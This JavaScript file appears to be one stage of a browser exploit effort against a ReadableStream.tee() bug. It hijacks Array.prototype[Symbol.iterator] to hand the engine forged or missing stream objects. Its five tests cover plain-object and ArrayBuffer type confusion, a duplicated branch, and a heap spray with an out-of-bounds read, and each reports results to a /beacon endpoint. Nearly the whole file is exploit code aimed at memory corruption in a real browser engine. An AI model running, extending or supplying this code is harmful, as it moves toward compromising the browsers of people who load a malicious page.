/*
 * p432 -- ReadableStream.tee() OOB exploitation
 *
 * CONFIRMED: V430 tee probe caused browser crash/hang when returning 1 element.
 * results[1] reads past the Vector allocation. ASSERT(results.size()==2) compiled out.
 *
 * Strategy: SequenceConverter uses WTF::Vector<Strong<JSObject>>.
 * Vector<Strong<JSObject>> with 1 element = 1 * 8 bytes (pointer sized).
 * results[1] reads the NEXT 8 bytes after the Vector's data.
 *
 * For a 1-element Vector, bmalloc allocates a small block.
 * results[1].get() returns whatever Strong<JSObject> is at offset +8.
 * If that memory contains a valid JSObject pointer, fromObject() wraps it.
 * If garbage, segfault.
 *
 * Plan:
 *   A: Spray InternalReadableStream-sized objects before tee
 *   B: Free some, create holes, then tee into a hole
 *   C: Controlled OOB with ArrayBuffer backing stores adjacent
 *   D: Safest approach: return 2 elements but second is OUR object
 *   E: Return 2 elements, second is an ArrayBuffer (type confusion)
 *
 * Beacon prefix: V432-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V432-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

// ================================================================
// Test A: Substitute second tee branch with our own ReadableStream
// (like V429 but for tee -- gives us an INTERNAL stream reference)
// ================================================================

function testA() {
  B("A-START");

  var rs = new ReadableStream({
    start: function(controller) {
      controller.enqueue("data-a-1");
      controller.enqueue("data-a-2");
      controller.close();
    }
  });

  var realBranch0 = null;
  var realBranch1 = null;
  var attackerStream = new ReadableStream({
    start: function(ctrl) {
      ctrl.enqueue("ATTACKER-DATA");
    }
  });

  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;

    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      var t0 = typeof self[0];
      if (t0 === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        realBranch0 = self[0]; // InternalReadableStream
        realBranch1 = self[1]; // InternalReadableStream
        B("A-INTERCEPT", {t0: t0, t1: typeof self[1]});

        // Return branch0 normally, substitute branch1 with... what?
        // fromObject() expects an InternalReadableStream (a JSObject with specific private props)
        // BUT it does NO type check -- ANY JSObject is accepted

        // Return both normally for now -- just capture refs
        return origIter.call(self);
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    B("A-TEE-OK", {len: branches.length});

    // Try reading from both branches
    var r0 = branches[0].getReader();
    var r1 = branches[1].getReader();

    r0.read().then(function(res) {
      B("A-R0", {done: res.done, val: String(res.value).slice(0, 30)});
    });
    r1.read().then(function(res) {
      B("A-R1", {done: res.done, val: String(res.value).slice(0, 30)});
    });

    // Check what the internal stream objects look like
    if (realBranch0) {
      var props0 = [];
      try {
        for (var k in realBranch0) { props0.push(k); if (props0.length > 10) break; }
      } catch(e) {}
      B("A-INTERNAL-PROPS", {count: props0.length, keys: props0.slice(0, 10)});

      // Can we access internal properties?
      try {
        B("A-INTERNAL-STATE", {
          locked: realBranch0.locked,
          controller: typeof realBranch0.controller,
          reader: typeof realBranch0.reader,
          state: realBranch0.state,
          storedError: typeof realBranch0.storedError
        });
      } catch(e) {
        B("A-INTERNAL-STATE-ERR", e.message.slice(0, 60));
      }
    }

  } catch(e) {
    B("A-ERR", e.message.slice(0, 80));
  }

  Array.prototype[Symbol.iterator] = origIter;

  setTimeout(function() {
    B("A-DONE");
  }, 500);
}

// ================================================================
// Test B: Substitute second branch with a PLAIN object
// fromObject() has no type check -- what happens?
// ================================================================

function testB() {
  B("B-START");

  var rs = new ReadableStream({
    start: function(controller) {
      controller.enqueue("data-b");
      controller.close();
    }
  });

  var fakeInternalStream = {
    // Try to mimic InternalReadableStream shape
    start: undefined,
    pull: undefined,
    cancel: undefined
  };

  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;

    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        B("B-INTERCEPT");

        var items = [self[0], fakeInternalStream];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    B("B-TEE-OK", {
      len: branches.length,
      type0: branches[0] ? branches[0].constructor.name : "?",
      type1: branches[1] ? branches[1].constructor.name : "?"
    });

    // branches[1] wraps our fakeInternalStream as a ReadableStream!
    // This is a type confusion: C++ thinks it's InternalReadableStream
    if (branches[1]) {
      B("B-BRANCH1-TYPE", branches[1].constructor.name);

      try {
        var locked = branches[1].locked;
        B("B-LOCKED", locked);
      } catch(e) {
        B("B-LOCKED-ERR", e.message.slice(0, 60));
      }

      try {
        var reader = branches[1].getReader();
        B("B-READER-OK");
        reader.read().then(function(res) {
          B("B-READ", {done: res.done, val: typeof res.value});
        }).catch(function(e) {
          B("B-READ-ERR", e.message.slice(0, 60));
        });
      } catch(e) {
        B("B-READER-ERR", e.message.slice(0, 60));
      }
    }
  } catch(e) {
    B("B-ERR", e.message.slice(0, 80));
  }

  Array.prototype[Symbol.iterator] = origIter;
}

// ================================================================
// Test C: Substitute with ArrayBuffer -- ultimate type confusion
// ================================================================

function testC() {
  B("C-START");

  var rs = new ReadableStream({
    start: function(controller) {
      controller.enqueue("data-c");
      controller.close();
    }
  });

  // Create an ArrayBuffer that will be treated as InternalReadableStream
  var confusionBuffer = new ArrayBuffer(256);
  var confusionView = new Uint32Array(confusionBuffer);
  // Fill with recognizable pattern
  for (var i = 0; i < confusionView.length; i++) {
    confusionView[i] = 0xCAFE0000 + i;
  }

  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;

    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        B("C-INTERCEPT");

        // Pass the ArrayBuffer as second element
        var items = [self[0], confusionBuffer];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    B("C-TEE-OK", {
      len: branches.length,
      type1: branches[1] ? branches[1].constructor.name : "?"
    });

    if (branches[1]) {
      B("C-BRANCH1", {
        type: typeof branches[1],
        ctor: branches[1].constructor ? branches[1].constructor.name : "?",
        isRS: branches[1] instanceof ReadableStream
      });

      // If this is a ReadableStream wrapping our ArrayBuffer as internal state...
      // accessing .locked reads from the "InternalReadableStream" which is actually our AB
      try {
        B("C-LOCKED", branches[1].locked);
      } catch(e) {
        B("C-LOCKED-ERR", e.message.slice(0, 60));
      }
    }
  } catch(e) {
    B("C-ERR", e.message.slice(0, 80));
  }

  Array.prototype[Symbol.iterator] = origIter;
}

// ================================================================
// Test D: Return real branch0 twice (both branches = same stream)
// ================================================================

function testD() {
  B("D-START");

  var rs = new ReadableStream({
    start: function(controller) {
      controller.enqueue("data-d-1");
      controller.enqueue("data-d-2");
      controller.close();
    }
  });

  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;

    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        B("D-INTERCEPT");

        // Return branch0 TWICE -- both branches share same InternalReadableStream
        var items = [self[0], self[0]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    B("D-TEE-OK", {len: branches.length});

    // Both branches point to same internal stream
    // This could cause double-read, double-close, or ref count issues
    var r0 = branches[0].getReader();
    B("D-R0-OK");

    // Try getting reader on branch[1] -- same internal stream, already locked?
    try {
      var r1 = branches[1].getReader();
      B("D-R1-OK");

      // Both reading from same internal -- race condition?
      r0.read().then(function(res) {
        B("D-R0-READ", {done: res.done, val: String(res.value).slice(0, 30)});
      }).catch(function(e) {
        B("D-R0-READ-ERR", e.message.slice(0, 60));
      });
      r1.read().then(function(res) {
        B("D-R1-READ", {done: res.done, val: String(res.value).slice(0, 30)});
      }).catch(function(e) {
        B("D-R1-READ-ERR", e.message.slice(0, 60));
      });
    } catch(e) {
      B("D-R1-ERR", e.message.slice(0, 60));
    }
  } catch(e) {
    B("D-ERR", e.message.slice(0, 80));
  }

  Array.prototype[Symbol.iterator] = origIter;
}

// ================================================================
// Test E: Size the Vector allocation, groom adjacent, OOB into controlled
// Spray objects THEN do 1-element tee to read adjacent heap data
// ================================================================

function testE() {
  B("E-START");

  // Phase 1: Spray many small objects (Strong<JSObject> = 8 bytes)
  // Vector<Strong<JSObject>> with 1 element occupies ~24 bytes (capacity+size+data)
  // or might be inline in the Vector
  // Adjacent data after the vector is what results[1] reads

  // Spray recognizable objects adjacent to where Vector allocates
  var spray = [];
  for (var i = 0; i < 2000; i++) {
    var obj = {};
    obj["mark_" + i] = 0xBEEF0000 + i;
    obj.idx = i;
    spray.push(obj);
  }
  B("E-SPRAY", spray.length);

  var rs = new ReadableStream({
    start: function(controller) {
      controller.enqueue("data-e");
      controller.close();
    }
  });

  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;

    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        B("E-INTERCEPT");

        // Return only 1 element -- results[1] reads OOB
        var items = [self[0]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    // If we get here, results[1] was a valid JSObject pointer!
    B("E-TEE-OK", {
      len: branches.length,
      type1: branches[1] ? branches[1].constructor.name : "null"
    });

    if (branches[1]) {
      // What kind of object did we get?
      B("E-OOB-OBJECT", {
        ctor: branches[1].constructor ? branches[1].constructor.name : "?",
        type: typeof branches[1],
        isRS: branches[1] instanceof ReadableStream
      });

      // Try to enumerate properties -- see if it's one of our spray objects
      var found = [];
      try {
        var keys = Object.keys(branches[1]);
        found = keys.slice(0, 5);
      } catch(e) {}
      B("E-OOB-PROPS", found);
    }
  } catch(e) {
    B("E-TEE-ERR", e.message.slice(0, 80));
  }

  Array.prototype[Symbol.iterator] = origIter;
  B("E-DONE");
}

// Run tests sequentially
testA();
setTimeout(function() { testB(); }, 600);
setTimeout(function() { testC(); }, 1200);
setTimeout(function() { testD(); }, 1800);
setTimeout(function() { testE(); }, 2400);
setTimeout(function() { B("DONE"); }, 4000);
})();
